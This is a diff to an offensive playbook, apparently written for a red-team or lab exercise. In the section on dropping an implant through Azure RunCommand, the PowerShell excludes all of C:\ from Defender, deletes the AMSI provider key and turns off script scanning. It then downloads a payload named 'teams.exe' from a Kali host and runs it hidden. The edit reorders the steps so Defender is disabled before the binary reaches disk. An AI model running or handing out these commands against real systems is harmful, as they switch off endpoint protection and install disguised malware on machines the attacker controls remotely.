@@ -269,17 +269,22 @@ Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden
 
 ### 4e: Direct Drop via RunCommand (No NC Shell Needed)
 
-```powershell
-# Step 1: Defender exclusion
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" `
-  -ScriptString 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f'
+**IMPORTANT: Run Step 1 and WAIT for it to complete before Step 2. Defender must be disabled BEFORE the binary touches disk or it gets quarantined.**
 
-# Step 2: Download + execute
+```powershell
+# Step 1: Disable Defender + AMSI (run this FIRST, wait for completion)
+$defenderOff = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f'
+
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" `
-  -ScriptString 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden' `
-  -AsJob
+  -CommandId "RunPowerShellScript" -ScriptString $defenderOff
+
+# WAIT for Step 1 to finish, THEN run Step 2:
+
+# Step 2: Download + execute implant
+$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
 ```
 
 ---
